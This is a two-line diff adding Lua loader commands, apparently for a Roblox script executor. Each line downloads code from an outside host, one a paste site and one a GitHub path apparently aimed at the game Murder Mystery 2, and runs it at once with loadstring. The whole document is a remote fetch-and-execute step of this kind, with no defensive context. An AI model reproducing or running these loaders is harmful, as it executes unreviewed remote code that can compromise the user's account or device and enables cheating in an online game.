@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("http://vpaste.net/rfyn4"))()
+loadstring(game:httpget("https://raw.githubusercontent.com/gumanba/scripts/main/mm2"))()
